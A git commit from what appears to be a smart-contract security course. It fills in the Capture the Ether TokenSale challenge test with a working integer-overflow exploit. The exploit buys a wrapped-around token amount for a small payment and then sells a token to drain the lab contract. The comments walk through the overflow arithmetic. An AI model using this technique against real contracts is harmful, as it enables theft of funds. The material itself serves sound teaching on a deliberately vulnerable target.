8e72ecdb495913de8ce14bfec98562cd6f575c0b
Yul Puma <yulppuma@gmail.com>
2025-07-16 23:20:30 -0700

    Finished TokenSaleChallenge. Took longer than expected, understanding how overflow can be used as an attack in this context.

--- module-6/CaptureTheEtherHardhat/test/10-TokenSale.test.ts
+++ module-6/CaptureTheEtherHardhat/test/10-TokenSale.test.ts
@@ -2,7 +2,7 @@ import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
 import { Contract } from 'ethers';
 import { ethers } from 'hardhat';
-const { utils } = ethers;
+const { utils, provider } = ethers;
 
 describe('TokenSaleChallenge', () => {
   let target: Contract;
@@ -24,10 +24,27 @@ describe('TokenSaleChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
-
+    console.log((2**256)/(10**18) + 1);
+    /*  1 token = 1 ether = 10^18 
+        Overflow logic when buying tokens:
+          2^256 = 0, (2^256) + 1 = 1  
+          require(msg.value = numTokens * PRICE_PER_TOKEN) OR
+          1 ether =  X * 10^18
+          cause an overflow(add '0') 2^256 + 1 ether = X *10^18 
+          => X * 10^18 = 2^256 + 10^18
+          => X = (2^256 + 10^18)/ 10^18 = 2^256/10^18 + 1
+          => X ~= 115792089237316195423570985008687907853269984665640564039458
+          All together: msg.value = X * 10^18
+                                  = 415992086870360064
+    */
+    ///let overflowVal = "115792089237316195423570985008687907853269984665640564039457";
+    let overflowVal ="115792089237316195423570985008687907853269984665640564039458";
+    let buyTx = await target.buy(overflowVal, {value: "415992086870360064",});
+    await buyTx.wait();
+    console.log("My balance: ", await target.balanceOf(attacker.address));
+    console.log("Contract balance: ", utils.formatEther(await provider.getBalance(target.address)));
+    let sellTx = await target.sell(1);
+    await sellTx.wait();
     expect(await target.isComplete()).to.equal(true);
   });
 });
